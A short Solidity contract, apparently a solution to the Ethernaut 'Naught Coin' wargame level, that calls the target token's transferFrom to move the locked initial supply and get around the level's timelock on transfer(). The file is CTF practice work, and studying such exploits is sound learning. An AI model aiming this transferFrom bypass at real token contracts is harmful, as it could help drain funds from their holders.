// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./15-naught-coin.sol";

// import the IERC20 interface?  Need to call transferFrom()

contract Attack15 {
    // state variables
    NaughtCoin public target;

    constructor(address _targetAddress) {
        // initialise values
        target = NaughtCoin(_targetAddress);
    }

    function attack(address _from, address _to, uint256 _amount) public {
        // call transferFrom
        // function transferFrom(address _from, address _to, uint256 _value)
        // public returns (bool success)

        // from: ETHERNAUT_INSTANCE, to: PLAYER, amount: INITIAL_SUPPLY
        target.transferFrom(_from, _to, _amount);
    }
}
